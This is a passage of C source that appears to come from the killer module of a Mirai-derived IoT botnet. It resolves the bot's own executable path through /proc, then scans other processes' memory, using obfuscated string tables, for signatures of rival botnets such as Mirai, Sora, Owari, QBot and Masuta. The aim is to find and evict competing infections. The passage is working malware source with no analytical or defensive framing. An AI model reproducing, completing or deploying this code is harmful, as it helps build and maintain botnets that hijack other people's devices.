{
    char path[PATH_MAX], *ptr = path, tmp[16];
    int fd;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, util_itoa(getpid(), 10, tmp));
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_EXE, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    fd = open(path, O_RDONLY);
    if (fd == -1)
        return FALSE;
    close(fd);

    readlink(path, self_realpath, sizeof(self_realpath) - 1);
    return TRUE;
}

static BOOL memory_scan_match(char *path)
{
    char rdbuf[4096];
    BOOL found = FALSE;
    int fd, ret;

    fd = open(path, O_RDONLY);
    if (fd == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_MIRAI);
    table_unlock_val(TABLE_MEM_SORA);
    table_unlock_val(TABLE_MEM_OWARI);
    table_unlock_val(TABLE_MEM_JOSHO);
    table_unlock_val(TABLE_MEM_APOLLO);
    table_unlock_val(TABLE_MEM_MASUTA);
    table_unlock_val(TABLE_MEM_VAMP);
    table_unlock_val(TABLE_MEM_QBOT);
    table_unlock_val(TABLE_MEM_IRC);
    table_unlock_val(TABLE_MEM_SHINTO);
    table_unlock_val(TABLE_MEM_OMNI);
    table_unlock_val(TABLE_MEM_EXTRA);

    while ((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_MIRAI, NULL), util_strlen(table_retrieve_val(TABLE_MEM_MIRAI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_SORA, NULL), util_strlen(table_retrieve_val(TABLE_MEM_SORA, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_OWARI, NULL), util_strlen(table_retrieve_val(TABLE_MEM_OWARI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_JOSHO, NULL), util_strlen(table_retrieve_val(TABLE_MEM_JOSHO, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_APOLLO, NULL), util_strlen(table_retrieve_val(TABLE_MEM_APOLLO, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_MASUTA, NULL), util_strlen(table_retrieve_val(TABLE_MEM_MASUTA, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_VAMP, NULL), util_strlen(table_retrieve_val(TABLE_MEM_VAMP, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_QBOT, NULL), util_strlen(table_retrieve_val(TABLE_MEM_QBOT, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_IRC, NULL), util_strlen(table_retrieve_val(TABLE_MEM_IRC, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_SHINTO, NULL), util_strlen(table_retrieve_val(TABLE_MEM_SHINTO, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_OMNI, NULL), util_strlen(table_retrieve_val(TABLE_MEM_OMNI, NULL))))
        {
            found = TRUE;
            break;
        }
        {
            int extra_len, xpos = 0;
            char *extra = table_retrieve_val(TABLE_MEM_EXTRA, &extra_len);
            while (xpos < extra_len)
            {
                char *name = extra + xpos;
                int nlen = util_strlen(name);
                if (nlen > 0 && mem_exists(rdbuf, ret, name, nlen))
                {
                    found = TRUE;
                    break;
                }
                xpos += nlen + 1;
            }
            if (found) break;
        }
    }

    table_lock_val(TABLE_MEM_MIRAI);
    table_lock_val(TABLE_MEM_SORA);
    table_lock_val(TABLE_MEM_OWARI);
    table_lock_val(TABLE_MEM_JOSHO);
    table_lock_val(TABLE_MEM_APOLLO);
    table_lock_val(TABLE_MEM_MASUTA);
    table_lock_val(TABLE_MEM_VAMP);
    table_lock_val(TABLE_MEM_QBOT);
    table_lock_val(TABLE_MEM_IRC);
    table_lock_val(TABLE_MEM_SHINTO);
    table_lock_val(TABLE_MEM_OMNI);
    table_lock_val(TABLE_MEM_EXTRA);

    close(fd);
    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;
    if (str_len > buf_len)
        return FALSE;
    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }
    return FALSE;
}
